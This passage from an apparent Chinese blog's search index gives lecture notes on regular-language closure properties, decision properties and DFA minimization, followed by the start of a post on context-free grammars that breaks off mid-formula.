mode=display\">\nL = \\lbrace ca^nb^n \\vert n \\geq 1 \\rbrace \\cup \\lbrace c^kw \\vert k \\not= 1,w \\in \\lbrace a,b \\rbrace^{\\ast} \\rbrace</script><ul>\n<li>其中$A = \\lbrace ca^nb^n \\vert n \\geq 1 \\rbrace$ 部分不是正则的</li>\n<li>而$B = \\lbrace c^kw \\vert k \\not= 1, w \\in \\lbrace a,b \\rbrace^{\\ast} \\rbrace$ 部分是正则的</li>\n<li>而$A$的任何串$w = ca^ib^i$，都可应用泵定理，因为$w=(\\epsilon)(c)(a^ib^i)$<br>重复字符$c$生成的新串都会落入$B$中。即存在符合泵引理，又不是正则的语言。</li>\n</ul>\n<h2 id=\"正则语言的封闭性\"><a href=\"#正则语言的封闭性\" class=\"headerlink\" title=\"正则语言的封闭性\"></a>正则语言的封闭性</h2><p><strong>定义</strong>：正则语言经某些运算后得到的语言任然保持正则，称正则语言在这些运算下封闭。</p>\n<p>正则语言$L$和$M$在这些运算下封闭：</p>\n<ul>\n<li>并：$L \\cup M$</li>\n<li>交：$L \\cap M$</li>\n<li>连接：$LM$</li>\n<li>反转：$L^R = \\lbrace w^R \\vert w \\in L \\rbrace$</li>\n<li>闭包：$L^{\\ast}$</li>\n<li>同态：$h(L) = \\lbrace h(w) \\vert w \\in L, \\text{同态} h:\\Sigma \\to \\Gamma^{\\ast} \\rbrace$</li>\n<li>补：$\\bar{L}$</li>\n<li>逆同态：$h^{-1}(L) = \\lbrace w \\in \\Sigma^{\\ast} \\vert h(w) \\in L \\subseteq \\Gamma^{\\ast}, \\text{同态} h:\\Sigma \\to \\Gamma^{\\ast} \\rbrace w$</li>\n<li>差：$L-M$</li>\n</ul>\n<p><strong>定理</strong>：正则语言在并，连接，闭包运算下保持封闭<br><strong>证明</strong>：由正则表达式的定义得证。语言$L=L(\\boldsymbol{r})$,$M=L(\\boldsymbol{s})$：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nL \\cup M &= L(\\boldsymbol{r} + \\boldsymbol{s}) \\\\\nLM &= L(\\boldsymbol{rs}) \\\\\nL^{\\ast} = L(r^{\\ast})\n\\end{aligned}</script><p><strong>定理</strong>：如果$L$是$\\Sigma^{\\ast}$上的正则语言，那么$\\bar{L} = \\Sigma^{\\ast} - L$也是正则的。<br><strong>证明</strong>：设接受$L$的DFA是：</p>\n<script type=\"math/tex; mode=display\">\nA = (Q, \\Sigma, \\delta, q_0, F)</script><p>即$\\boldsymbol{L}(A) = L$，构造DFA</p>\n<script type=\"math/tex; mode=display\">\nB = (Q, \\Sigma, \\delta, q_0, Q - F)</script><p>则有$\\bar{L} = \\boldsymbol{L}(B)$，因为$\\forall w \\in \\Sigma^{\\ast}$</p>\n<script type=\"math/tex; mode=display\">\nw \\in \\bar{L} \\Longleftrightarrow \\hat\\delta(q_0,w) \\not\\in F \\Longleftrightarrow \\hat\\delta(q_0,w) \\in Q-F \\Longleftrightarrow w \\in \\boldsymbol{L}(B)</script><blockquote>\n<p>注意：用这种方法求正则语言的补的时候，DFA不能有缺失状态</p>\n</blockquote>\n<p>例：若$\\Sigma = \\lbrace 0,1 \\lbrace$，$L = \\lbrace \\epsilon \\rbrace$的DFA如图，请给出$\\bar{L}$的DFA<br><img src=\"55.png\" alt=\"\"><br>$\\emptyset \\not= \\bar{\\lbrace \\epsilon \\rbrace} = \\Sigma^{+}$，应使用完整的DFA：<br><img src=\"56.png\" alt=\"\"><br>$\\Sigma^{+} = \\bar{\\lbrace \\epsilon \\rbrace}$</p>\n<p>例：证明$L_{neq} = \\lbrace w \\vert w \\text{由数量不相等的0和1构成} \\rbrace$不是正则语言</p>\n<ul>\n<li>由泵引理不易直接证明，可以证明$\\bar{L<em>{neq}}$非正则，而$\\bar{L</em>{neq}} = L<em>{eq}$可以用泵引理证明非正则，所以由封闭性$L</em>{neq}$也不是正则的。</li>\n</ul>\n<p><strong>定理</strong>：若DFA $A_L$，$A_M$和$A$的定义如下：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nA_L &= (Q_L, \\Sigma, \\delta_L, q_L, F_L) \\\\\nA_M &= (Q_M, \\Sigma, \\delta_M, q_M, F_M) \\\\\nA &= (Q_L \\times Q_M, \\Sigma, \\delta,(q_L,q_M), F_L \\times F_M) \\\\\n\\end{aligned}</script><p>其中:</p>\n<script type=\"math/tex; mode=display\">\n\\delta:(Q_L \\times Q_M) \\times \\Sigma \\to Q_L \\times Q_M \\\\\n\\delta((p,q),a) = (\\delta_L(p,a),\\delta_M(q,a))</script><p>则对任意$w \\in \\Sigma^{\\ast}$:</p>\n<script type=\"math/tex; mode=display\">\n\\hat\\delta((q_L,q_M),w) = (\\hat\\delta(q_L,w),\\hat\\delta(q_M,w))</script><p><strong>证明</strong>：通过对$w$的归纳来证明：</p>\n<ul>\n<li>归纳基础：当$w = \\epsilon$时：<script type=\"math/tex; mode=display\">\n\\hat\\delta((q_L,q_M),w) = (q_L,q_M) = (\\hat\\delta_L(q_L,\\epsilon),\\hat\\delta_M(q_M,\\epsilon))</script>归纳地推：当$w=xa$时，<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n\\hat\\delta((q_L,q_M),xa) &= \\delta(\\hat\\delta((q_L,q_M),x),a) \\\\\n&= \\delta((\\hat\\delta(q_L,x),\\hat\\delta(q_M,x)),a) \\\\\n&= (\\delta_L(\\hat\\delta_L(q_L,x),a),\\delta_M(\\hat\\delta_M(q_M,x),a)) \\\\\n&= (\\hat\\delta_L(q_L，xa),\\hat\\delta_M(q_M,xa)) \\\\\n\\end{aligned}</script></li>\n</ul>\n<p><strong>定理</strong>：如果$L,M$是正则语言，那么$L \\cap M$也是正则语言</p>\n<p><strong>证明1</strong>：由$L \\cap M = \\bar{bar{L} \\cup bar{M}}$得证</p>\n<p><strong>证明2</strong>：由上一定理，构造识别$L \\cap M$的DFA A，则$\\forall w \\in \\Sigma^{\\ast}$：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nw \\in L \\cap M & \\Longleftrightarrow \\hat\\delta_L(q_L,w) \\in F_L \\land \\hat\\delta_M(q_M,w) \\in F_M \\\\\n& \\Longleftrightarrow (\\hat\\delta_L(q_L,w), \\hat\\delta_M(q_M,w)) \\in F_L \\times F_M \\\\\n& \\Longleftrightarrow \\hat\\delta((q_L,q_M),w) \\in F_L \\times F_M \\\\\n& \\Longleftrightarrow w \\in \\boldsymbol{L}(A) \\\\\n\\end{aligned}</script><p>例：如果已知语言$L<em>{01} = \\lbrace 0^n1^n \\vert n \\geq 0 \\rbrace $不是正则的，请用封闭性证明语言$L</em>{eq} = \\lbrace w \\vert w \\text{由数量相等的0和1构成} \\rbrace$也不是正则的</p>\n<p><strong>证明</strong>：</p>\n<ul>\n<li>首先，因为$\\boldsymbol{0}^{\\ast}\\boldsymbol{1}^{\\ast}$是正则语言</li>\n<li>而$L<em>{01} = \\boldsymbol{L}(\\boldsymbol{0}^{\\ast}\\boldsymbol{1}^{\\ast}) \\cap L</em>{eq}$</li>\n<li>如果$L_{eq}$是正则的，$L{01}$必然也是正则的</li>\n<li>因为已知$L<em>{01}$不是正则的，所以$L</em>{eq}$一定不是正则的</li>\n</ul>\n<p>例：如果$L_1$和$L_2$都不是正则语言，那么$L_1 \\cap L_2$一定不是正则的吗？</p>\n<p>令$L_1 = \\lbrace 0^n1^n \\vert n \\geq \\rbrace$，$L_2 = \\lbrace a^nb^n \\vert n \\geq \\rbrace$。显然两者都不是正则语言，但$L_1 \\cap L_2 = \\lbrace \\epsilon \\rbrace$是正则语言</p>\n<p><strong>定理</strong>：如果$L$和$M$都是正则语言，那么$L-M$也是正则的。</p>\n<p><strong>证明</strong>：$L-M = L \\cap \\bar{M}$显然是正则的</p>\n<p><strong>定义</strong>：字符串$w = a_1a_2 \\dots a_n$的反转，记为$w^R$，定义为：</p>\n<script type=\"math/tex; mode=display\">\nw^R = a_n a_{n-1} \\dots a_1</script><p>语言$L$的反转，记为$L^R$，定义为：</p>\n<script type=\"math/tex; mode=display\">\nL^R = \\lbrace w^R \\in \\Sigma^{\\ast} \\vert w \\in L \\rbrace</script><p><strong>定理</strong>：如果一个语言$L$是正则的，$L^R$也是正则的。</p>\n<p>对正则表达式$E$的结构归纳，往证$\\boldsymbol{L}(E^R)=(\\boldsymbol{L}(E))^R$（构造出反转语言对应的正则表达式$\\boldsymbol{E}^R$。</p>\n<p>例：语言$L$及其反转$L^R$，分别是：</p>\n<script type=\"math/tex; mode=display\">\nL = \\lbrace w \\in \\lbrace 0,1 \\rbrace^{\\ast} \\vert w \\text{ ends in 01} \\rbrace\nL^R = \\lbrace w \\in \\lbrace 0,1 \\rbrace^{\\ast} \\vert w \\text{ starts with 10} \\rbrace</script><p>正则表达式为：</p>\n<script type=\"math/tex; mode=display\">\nL = (\\boldsymbol{0} + \\boldsymbol{1})^{\\ast}\\boldsymbol{01}\nL^R = \\boldsymbol{10}(\\boldsymbol{0}+\\boldsymbol{1})^{\\ast}</script><p>定理<strong>证明</strong>：  </p>\n<ul>\n<li><p>归纳基础：</p>\n<ul>\n<li>当$E = \\emptyset$时，有$\\emptyset^R = \\emptyset$</li>\n<li>当$E = \\boldsymbol{\\epsilon}$时，有$\\boldsymbol{\\epsilon}^R = \\epsilon$</li>\n<li>当$\\forall a \\in \\Sigma$，当$E = \\boldsymbol{a}$时，有$\\boldsymbol{a}^R = \\boldsymbol{a}$<br>都满足$\\boldsymbol{L}(E^R)=(\\boldsymbol{L}(E))^R$，因此命题成立。</li>\n</ul>\n</li>\n<li><p>归纳递推：</p>\n<ul>\n<li>当$E = E_1 + E_2$时，有$(E_1 + E_2)^R = E_1^R + E_2^R$<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n(\\boldsymbol{L}(E_1+ E_2))^R &= (\\boldsymbol{L}(E_1) \\cup \\boldsymbol{L}(E_2))^R \\\\\n&= \\lbrace w^R \\vert w \\in \\boldsymbol{L}(E_1) \\cup w \\in \\boldsymbol{L}(E_2) \\rbrace \\\\\n&= (\\boldsymbol{L}(E_1))^R \\cup (\\boldsymbol{L}(E_2))^R \\\\\n&= \\boldsymbol{L}(E_1^R) \\cup \\boldsymbol{L}(E_2^R) \\\\\n&= \\boldsymbol{L}(E_1^R + E_2^R)\n\\end{aligned}</script></li>\n<li>当$E=E_1E_2$时，有$(E_1E_2)^R = E_2^R E_1^R$<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n(\\boldsymbol{L}(E_1 E_2))^R &= (\\boldsymbol{L}(E_1)\\boldsymbol{L}(E_2))^R \\\\\n&= \\lbrace w_1w_2 \\vert w_1 \\in \\boldsymbol{L}(E_1),w_2 \\in \\boldsymbol{L}(E_2) \\rbrace^R \\\\\n&= \\lbrace (w_1w_2)^R \\vert w_1 \\in \\boldsymbol{L}(E_1),w_2 \\in \\boldsymbol{L}(E_2) \\rbrace \\\\\n&= \\lbrace w_2^Rw_1^R \\vert w_1 \\in \\boldsymbol{L}(E_1),w_2 \\in \\boldsymbol{L}(E_2) \\rbrace \\\\\n&= \\lbrace w_2^R \\vert w_2 \\in \\boldsymbol{L}(E_2) \\rbrace \\lbrace w_1^R \\vert w_1 \\in \\boldsymbol{L}(E_1) \\rbrace \\\\\n&= (\\boldsymbol{L}(E_2))^R (\\boldsymbol{L}(E_1))^R \\\\\n&= \\boldsymbol{L}(E_2^R)\\boldsymbol{L}(E_1^R) = \\boldsymbol{L}(E_2^RE_1^R) \\\\\n\\end{aligned}</script></li>\n<li>当$E = E_1^{\\ast}$时，有$(E_1^{\\ast})^R = (E_1^R)^{\\ast}$<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n(\\boldsymbol{L}(E_1^{\\ast}))^R &= \\lbrace w_1w_2 \\dots w_n \\vert n \\geq 0, w_i \\in \\boldsymbol{L}(E_1) \\rbrace^R \\\\\n&= \\lbrace (w_1w_2 \\dots w_n)^R \\vert n \\geq 0, w_i \\in \\boldsymbol{L}(E_1) \\rbrace \\\\\n&= \\lbrace w_1^Rw_2^R \\dots w_n^R \\vert n \\geq 0, w_i \\in \\boldsymbol{L}(E_1) \\rbrace \\\\\n&= \\lbrace w_1^Rw_2^R \\dots w_n^R \\vert n \\geq 0, w_i^R \\in \\boldsymbol{L}(E_1^R) \\rbrace \\\\\n&= \\lbrace w_1w_2 \\dots w_n \\vert n \\geq 0, w_i \\in \\boldsymbol{L}(E_1^R) \\rbrace \\\\\n&= \\boldsymbol{L}((E_1^R)^{\\ast}) \\\\\n\\end{aligned}</script></li>\n</ul>\n<p>都满足$\\boldsymbol{L}(E^R)=(\\boldsymbol{L}(E))^R$，因此命题成立，所以$L^R$也是正则语言</p>\n</li>\n</ul>\n<p><strong>定义</strong>：若$\\Sigma$和$\\Gamma$是两个字符集，同态定义为函数$h:\\Sigma \\to \\Gamma^{\\ast}$</p>\n<script type=\"math/tex; mode=display\">\n\\forall a \\in \\Sigma,h(a) \\in \\Gamma^{\\ast}</script><p>扩展$h$的定义到字符串：</p>\n<script type=\"math/tex; mode=display\">\nh(\\epsilon) = \\epsilon  \\\\\nh(xa) = h(x)h(a)</script><p>再将$h$拓展到语言，对$\\forall L \\subseteq \\Sigma^{\\ast}$</p>\n<script type=\"math/tex; mode=display\">\nh(L) = \\lbrace h(w) \\vert w \\in L \\rbrace</script><p>例：若$\\Sigma = \\lbrace 0,1 \\rbrace, \\Gamma = \\lbrace a,b \\rbrace的同态函数$h$为：</p>\n<script type=\"math/tex; mode=display\">\nh(0) = ab, \\ h(1) = \\epsilon</script><p>则$\\Sigma$上的字符串0011在$h$的作用下</p>\n<script type=\"math/tex; mode=display\">\nh(0011) = h(0)h(0)h(1)h(1) = abab\\epsilon\\epsilon = abab</script><p>语言$L = \\boldsymbol{1}^{\\ast}\\boldsymbol{0}+\\boldsymbol{0}^{\\ast}\\boldsymbol{1}$，在$h$的作用下，$h(L)$为：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nh(\\boldsymbol{1}^{\\ast}\\boldsymbol{0}+\\boldsymbol{0}^{\\ast}\\boldsymbol{1}) &= \n(h(\\boldsymbol{1}))^{\\ast} h(\\boldsymbol{0}) + (h(\\boldsymbol{0}))^{\\ast} h(\\boldsymbol{1}) \\\\\n&= (\\epsilon)^{\\ast}(ab)+(ab)^{\\ast}(\\epsilon) \\\\\n&= (ab)^{\\ast} \\\\\n\\end{aligned}</script><p><strong>定理（同态的封闭性）</strong>：<br>若$L$是字母表$\\Sigma$上的正则语言，$h$是$\\Sigma$上的同态，则$h(L)$也是正则的</p>\n<p>若$L$的正则表达式为$E$，即$L = \\boldsymbol{L}(E)$，按如下规则构造表达式$h(E)$</p>\n<script type=\"math/tex; mode=display\">\nh(\\emptyset) = \\emptyset \\\\\nh(\\boldsymbol{\\epsilon}) = \\boldsymbol{\\epsilon} \\\\\n\\forall a \\in \\Sigma,h(\\boldsymbol{a}) = h(a)</script><script type=\"math/tex; mode=display\">\nh(\\boldsymbol{r}+\\boldsymbol{s}) = h(\\boldsymbol{r}) + h(\\boldsymbol{s}) \\\\\nh(\\boldsymbol{rs}) = h(\\boldsymbol{r})h(\\boldsymbol{s}) \\\\\nh(\\boldsymbol{r}^{\\ast}) = (h(\\boldsymbol{r}))^{\\ast}</script><p>往证$\\boldsymbol{L}(h(E)) = h(\\boldsymbol{L}(E))$，而$h(E)$显然也是正则表达式，因此$h(L)$是正则</p>\n<p><strong>证明</strong>：对$E$的结构归纳，往证$\\boldsymbol{L}(h(E)) = h(\\boldsymbol{L}(E))$，归纳基础：</p>\n<ul>\n<li>当$E = \\epsilon$时<script type=\"math/tex; mode=display\">\nh(\\boldsymbol{L}(\\boldsymbol{\\epsilon})) = h(\\lbrace \\epsilon \\rbrace) = \\lbrace \\epsilon \\rbrace = \\boldsymbol{L}(\\boldsymbol{\\epsilon}) = \\boldsymbol{L}(h(\\boldsymbol{\\epsilon}))</script></li>\n<li>当$E=\\emptyset$<script type=\"math/tex; mode=display\">\nh(\\boldsymbol{L}(\\emptyset)) = h(\\emptyset) = \\emptyset = \\boldsymbol{L}(\\emptyset) = \\boldsymbol{L}(h(\\emptyset))</script></li>\n<li>$\\forall a \\in \\Sigma$，当$E=\\boldsymbol{a}$时<script type=\"math/tex; mode=display\">\nh(\\boldsymbol{L}(\\boldsymbol{a})) = h(\\lbrace a \\rbrace) = \\lbrace h(a) \\rbrace = \\boldsymbol{L}(h(a)) = \\boldsymbol{L}(h(\\boldsymbol{a}))</script>所以命题成立<br>归纳对推，假设对正则表达式$F,G$分别有：<script type=\"math/tex; mode=display\">\n\\boldsymbol{L}(h(F)) = h(\\boldsymbol{L}(F)), \\ \\boldsymbol{L}(h(G)) = h(\\boldsymbol{L}(G))</script></li>\n<li>当$E=F+G$时：<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nh(\\boldsymbol{L}(F+G)) &= h(\\boldsymbol{L}(F) \\cup \\boldsymbol{L}(G)) \\\\\n&= h(\\boldsymbol{L}(F)) \\cup h(\\boldsymbol{L}(G)) \\\\\n&= \\boldsymbol{L}(h(F)) \\cup \\boldsymbol{L}(h(G)) \\\\\n&= \\boldsymbol{L}(h(F)+h(G)) \\\\\n&= \\boldsymbol{L}(h(F+G)) \\\\\n\\end{aligned}</script></li>\n<li>当$E =FG$,$E=F^{\\ast}$同理</li>\n</ul>\n<p><strong>定义</strong>：若$h$是字母表$\\Sigma$到$\\Gamma$的同态，且$L$识别$\\Gamma$上的语言，那么使$h(w) \\in L$的$w(w \\in \\Sigma^{\\ast})$的集合，称为语言$L$的$h$逆，记为$h^{-1}(L)$，即：</p>\n<script type=\"math/tex; mode=display\">\nh^{-1}(L) = \\lbrace w \\in \\Sigma^{\\ast} \\vert h(w) \\in L \\rbrace</script><p><strong>证明</strong>：由L的DFA $A=(Q, \\Sigma, \\delta, q_0, F)$，构造识别$h^{-1}(L)$的DFA。</p>\n<script type=\"math/tex; mode=display\">\nB = (Q, \\Sigma, \\delta^{\\prime}, q_0, F)</script><p>其中$\\delta^{\\prime}(q,a) = \\hat\\delta(q,h(a))$,<br><img src=\"\" alt=\"\"><br>为证明$\\boldsymbol{L}(B) = h^{-1}(L)$，先证明$\\hat\\delta^{\\prime}(q,w)=\\hat\\delta(q,h(w))$<br>对$w$归纳，往证$\\hat\\delta^{\\prime}(q,w)=\\hat\\delta(q,h(w))$</p>\n<ul>\n<li>归纳基础：若$w=\\epsilon$：<script type=\"math/tex; mode=display\">\n\\hat\\delta(q,h(\\epsilon)) = \\hat\\delta(q,\\epsilon)) = q = \\hat\\delta^{\\prime}(q,\\epsilon)</script></li>\n<li>归纳递推：若$w=xa$<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n\\hat\\delta^{\\prime}(q,xa) &= \\delta^{\\prime}(\\delta^{\\prime}(q,x),a) \\\\ \n&= \\delta^{\\prime}(\\hat\\delta(q,h(x)),a) \\\\\n&= \\hat\\delta(\\hat\\delta(q,h(x)),h(a)) \\\\\n&= \\hat\\delta(q,h(x)h(a)) \\\\\n&= \\hat\\delta(q,h(xa))\n\\end{aligned}</script></li>\n</ul>\n<p>所以$\\forall w \\in \\Sigma^{\\ast}, \\hat\\delta^{\\prime}(q_0,w)=\\hat\\delta(q_0,h(w)) \\in F$，即$w$被$B$接受当且仅当$h(w)$被$A$接受，$B$是识别$h^{-1}(L)$的DFA，因此$h^{-1}(L)$是正则的。</p>\n<p>例：证明$L = \\lbrace 0^n 1^{2n} \\vert n \\geq 0 \\rbrace$不是正则语言。</p>\n<p><strong>证明</strong>：设同态$h : \\lbrace 0,1 \\rbrace \\to \\lbrace 0,1 \\rbrace^{\\ast}$为：</p>\n<script type=\"math/tex; mode=display\">\nh(0)=10 \\\\\nh(1)=11 \\\\</script><p>那么，$h^{-1}(L) = \\lbrace 0^n 1^n \\vert n \\geq 0 \\rbrace = L<em>{01}$，因为$L</em>{01}$不是正则的，由封闭性，$L$也不是正则的</p>\n<p>例：若语言$L=(\\boldsymbol{00}+\\boldsymbol{1})^{\\ast}$，同态$h:\\lbrace a,b \\rbrace \\to \\lbrace 0,1 \\rbrace^{\\ast}$为：</p>\n<script type=\"math/tex; mode=display\">\nh(a) = 01 , \\ \\ h(b) = 10</script><p>证明$h^{-1}(L)=(\\boldsymbol{ba})^{\\ast}$</p>\n<p><strong>证明</strong>：往证$h(w) \\in L \\Longleftrightarrow w = (ba)^n$<br>$(\\Leftarrow)$若$w=(ba)^n$，而$h(ba)=10001$，因此$h(w)=(1001)^n \\in L$<br>$(\\Rightarrow)$若$h(w) \\in L$，假设$w \\not\\in (\\boldsymbol{ba})^{\\ast}$，则只能有四种情况：</p>\n<ul>\n<li>$w$以$a$开头，则$h(w)$以01开头，显然$h(w) \\not\\in (\\boldsymbol{00}+\\boldsymbol{1})^{\\ast}$</li>\n<li>$w$以$b$结尾，则$h(w)$以10结尾，显然$h(w) \\not\\in (\\boldsymbol{00}+\\boldsymbol{1})^{\\ast}$</li>\n<li>$w$有连续的a，即$w=xaay$，即$h(w)=z1010v$，则显然$h(w) \\not\\in (\\boldsymbol{00}+\\boldsymbol{1})^{\\ast}$</li>\n<li>$w$有连续的b，即$w=xbby$，即$h(w)=z1010v$，则显然$h(w) \\not\\in (\\boldsymbol{00}+\\boldsymbol{1})^{\\ast}$<br>因此$w$只能是$(ba)^n$，$n \\geq 0$的形式</li>\n</ul>\n<h2 id=\"正则语言的判定性质\"><a href=\"#正则语言的判定性质\" class=\"headerlink\" title=\"正则语言的判定性质\"></a>正则语言的判定性质</h2><p>正则语言，或任何语言，典型的3个判定问题：</p>\n<ul>\n<li>以某种形式化模型描述的语言是否为空，是否无穷</li>\n<li>某个特定的串$w$是否属于所描述的语言</li>\n<li>以两种方式描述的语言是否是相同的?——语言的等价性</li>\n</ul>\n<p><strong>定理</strong>：具有$n$个状态的有穷自动机M接受的集合$S$</p>\n<ul>\n<li>$S$是非空的，当且仅当M接受某个长度小于$n$的串</li>\n<li>$S$是无穷的，当且仅当M接受某个长度为$m$的串，$n \\leq m \\lt 2n$</li>\n</ul>\n<p>所以，对于正则语言：</p>\n<ul>\n<li>存在算法，判断其是否为空，只需要检查全部长度小于$n$的串</li>\n<li>存在算法，判断其是否无穷，只需检查全部长度由$n$到$2n-1$的串</li>\n</ul>\n<p><strong>证明</strong>：设接受正则语言$S$的DFA为M<br>先证明“<strong>$S$是非空的，当且仅当M接受某个长度小于$n$的串</strong>”</p>\n<ul>\n<li>必要性：显然成立</li>\n<li>充分性：<ul>\n<li>如果$S$非空，设$w$是M接受的串长中长度最小者之一</li>\n<li>必然$\\vert w \\vert \\lt n$，否则由泵引理$w=xyz$接受$xz$更短</li>\n</ul>\n</li>\n</ul>\n<p>再证明“<strong>$S$是无穷的，当且仅当M接受某个长度为$m$的串，$n \\leq m \\lt 2n$</strong>”</p>\n<ul>\n<li>必要性：由泵定理，显然成立</li>\n<li>充分性：<ul>\n<li>如果$S$无穷，假设没有长度在$[n,2n-1)$之间的串</li>\n<li>那么取$w=\\boldsymbol{L}(M)$是长度$\\geq 2n$中最小者之一</li>\n<li>由泵定理$w=xyz$，且M会接受更短的串$xz$</li>\n<li>于是，或者$w$不是长度最小的，或者长度$n$到$2n-1$之间有被接受的串，因此假设不成立</li>\n</ul>\n</li>\n</ul>\n<p><strong>定理</strong>：存在算法，判定两个有穷自动机是否等价（接受语言相同）</p>\n<p><strong>证明</strong>：</p>\n<ul>\n<li>设$M_1$和$M_2$是分别接受$L_1$和$L_2$的有穷自动机</li>\n<li>则$(L_1 \\cap \\bar{L_2}) \\cup (\\bar{L_1} \\cap L_2)$是正则的，所以可被某个有穷自动机$M_3$接受</li>\n<li>而$M_3$接受某个串，当且仅当$L_1 \\not= L_2$</li>\n<li>由于存在算法判断$\\boldsymbol{L}(M_3)$是否为空，因此得证$</li>\n</ul>\n<h2 id=\"自动机的最小化\"><a href=\"#自动机的最小化\" class=\"headerlink\" title=\"自动机的最小化\"></a>自动机的最小化</h2><p><strong>定义</strong>：DFA $A=(Q, \\Sigma, \\delta, q_0, F)$中两个状态$p$和$q$，对$\\forall w \\in \\Sigma^{\\ast}$：</p>\n<script type=\"math/tex; mode=display\">\n\\hat\\delta(p,w) \\in F \\Longleftrightarrow \\hat\\delta(q,w) \\in F</script><p>则称这两个状态是等价的，否则称为可区分的。</p>\n<ul>\n<li>将DFA中等价状态找出经行合并，就能找出最小的DFA</li>\n<li>等价性只要求$\\hat\\delta(p,w)$和$\\hat\\delta(q,w)$同时在或者不在$F$中，而不必是相同状态</li>\n</ul>\n<p><strong>填表算法</strong>:<br>递归寻找DFA中全部的可区分状态对：</p>\n<ul>\n<li>如果$p \\in F$且$q \\not\\in F$，则(p,q)是可区分的</li>\n<li>$\\exists a \\in \\Sigma$，如果：<script type=\"math/tex; mode=display\">\n(r=\\delta(p,a), s=\\delta(q,a))</script>是可区分的，则$(p,q)$是可区分的</li>\n</ul>\n<p><strong>定理</strong>：<br>如果填表算法不能区分两个状态，则这两个状态是等价的</p>\n<p>例：用填表算法找到如图DFA中全部可区分状态对<br><img src=\"60.png\" alt=\"\"></p>\n<p>标记终态和非终态之间的状态对：</p>\n<script type=\"math/tex; mode=display\">\n\\lbrace C \\rbrace \\times \\lbrace A,B,D,E,F,G,H \\rbrace</script><p>标记所有经过字符0到终态和非终态的状态对：</p>\n<script type=\"math/tex; mode=display\">\n\\lbrace D,F \\rbrace \\times \\lbrace A,B,C,E,G,H \\rbrace</script><p>标记所有经过字符1到终态和非终态的状态对：</p>\n<script type=\"math/tex; mode=display\">\n\\lbrace B,H \\rbrace \\times \\lbrace A,C,D,E,F,G \\rbrace</script><p>此时还有$(A,E),(A,G),(B,H),(D,F),(E,G)$未标记，只需逐个检查:</p>\n<ul>\n<li>$(A,G)$是可区分的，因为经串01到可区分的$(C,E)$</li>\n<li>$(E,G)$是可区分的，因为经串10到可区分的$(C,H)$<br>而$(A,E),(B,H)和(D,F)$在经很短的字符串后，都会到达相同状态，因此都是等价的</li>\n</ul>\n<p>根据等价状态，将状态集划分成块，构造等价的最小化DFA<br><img src=\"61.png\" alt=\"\"></p>\n","categories":["形式语言与自动机理论"],"tags":["形式语言与自动机理论"]},{"title":"形式语言与自动机理论（3）上下文无关文法","url":"/2021/01/27/%E5%BD%A2%E5%BC%8F%E8%AF%AD%E8%A8%80%E4%B8%8E%E8%87%AA%E5%8A%A8%E6%9C%BA%E7%90%86%E8%AE%BA%EF%BC%883%EF%BC%89%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/","content":"<h2 id=\"上下文无关文法\"><a href=\"#上下文无关文法\" class=\"headerlink\" title=\"上下文无关文法\"></a>上下文无关文法</h2><h3 id=\"自然语言文法\"><a href=\"#自然语言文法\" class=\"headerlink\" title=\"自然语言文法\"></a>自然语言文法</h3><p>一个英语语法的例子：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n\\langle sentense \\rangle &\\to \\langle noun-phrase \\rangle \\langle verb-phrase \\rangle \\\\\n\\langle noun-phrase \\rangle &\\to \\langle article \\rangle \\langle noun \\rangle  | \\langle article \\rangle \\langle adjective \\rangle \\langle noun \\rangle  \\\\\n\\langle verb-phrase \\rangle &\\to \\langle verb \\rangle  | \\langle verb \\rangle \\langle none-phrase \\rangle \\\\\n\\langle article \\rangle &\\to \\boldsymbol{a} \\vert \\boldsymbol{the} \\\\\n\\langle noun \\rangle &\\to \\boldsymbol{boy} \\vert\\boldsymbol{girl} \\vert \\boldsymbol{cat} \\\\\n\\langle verb \\rangle &\\to \\boldsymbol{sees} \\vert \\boldsymbol{likes} \\\\\n\\dots \\\\\n\\end{aligned}</script><p>根据语法结构，可以从$ \\langle sentense \\rangle$推出一个句子：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n \\langle sentense \\rangle  &\\Rightarrow  \\langle noun-phrase \\rangle  \\langle verb-phrase \\rangle  \\\\\n&\\Rightarrow  \\langle article \\rangle  \\langle noun \\rangle  \\langle verb-phrase \\rangle  \\\\\n&\\Rightarrow  \\langle article \\rangle  \\langle noun \\rangle  \\langle verb \\rangle  \\langle noun-phrase \\rangle  \\\\\n&\\Rightarrow  \\langle article \\rangle  \\langle noun \\rangle  \\langle verb \\rangle  \\langle article \\rangle  \\langle adjective \\rangle  \\langle noun \\rangle  \\\\\n&\\Rightarrow \\boldsymbol{the}  \\langle noun \\rangle  \\langle verb \\rangle  \\langle article \\rangle  \\langle adjective \\rangle  \\langle noun \\rangle  \\\\\n&\\Rightarrow \\boldsymbol{the \\ girl}  \\langle verb \\rangle   \\langle article \\rangle   \\langle adjective \\rangle   \\langle noun \\rangle  \\\\\n&\\Rightarrow \\dots \\\\\n&\\Rightarrow \\boldsymbol{the \\ girl \\ sees \\ a \\ blue \\ cat}\n\\end{aligned}</script><p>很显然，这个句子是符合$\\langle sentense \\rangle$的句子结构的。从$ \\langle sentense \\rangle$到句子这一过程，使用的过程就是文法。<br><span id=\"more\"></span></p>\n<h3 id=\"形式定义\"><a href=\"#形式定义\" class=\"headerlink\" title=\"形式定义\"></a>形式定义</h3><p>接下来，由一个回文字符串的定义引出上下文无关文法的形式定义。<br><strong>定义</strong>：如果字符串$w \\in \\Sigma^{\\ast}$满足$w = w^R$，则称字符串$w$为回文（palindrome）。如果语言$L$中的字符串都是回文，则称$L$为回文语言。</p>\n<script type=\"math/tex; mode=display\">\nL = \\lbrace w \\in \\Sigma^{\\ast} \\vert w = w^R \\rbrace</script><p>例：$\\Sigma = \\lbrace 0,1 \\rbrace$上的回文语言：</p>\n<script type=\"math/tex; mode=display\">\nL_{pal} = \\lbrace w \\in \\lbrace 0,1 \\rbrace^{\\ast} \\vert w = 